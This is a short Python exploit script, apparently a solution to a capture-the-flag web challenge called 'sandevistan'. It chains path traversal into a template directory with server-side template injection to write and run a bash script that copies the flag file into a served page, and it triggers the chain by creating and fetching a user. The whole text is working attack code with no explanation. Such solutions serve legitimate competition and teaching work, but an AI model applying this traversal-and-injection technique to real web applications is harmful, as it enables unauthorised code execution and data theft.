import requests

URL = "http://sandevistan.chal.perfect.blue:28953"

def cyberware_get(cyberware_name):
    return requests.get(f"{URL}/cyberware", params={"cyberware": cyberware_name})

def cyberware_post(username, name):
    return requests.post(f"{URL}/cyberware", data={"username": username, "name": name})

def user_get(username):
    return requests.get(f"{URL}/user", params={"username": username})

def user_post(username):
    return requests.post(f"{URL}/user", data={"username": username})


bash = """#!/bin/bash
cat /flag > /app/tmpl/index.html

""".replace('\n', '\\n')

cyberware_post("../tmpl/user.html", '{{ .NewError "foo" "/bin/true" }} {{ .SerializeErrors "' + bash + '" 0 0  }} {{ .UserHealthcheck }}') # Inject template syntax into the user template

user_post("den") # Create the user
user_get("den") # Trigger the template
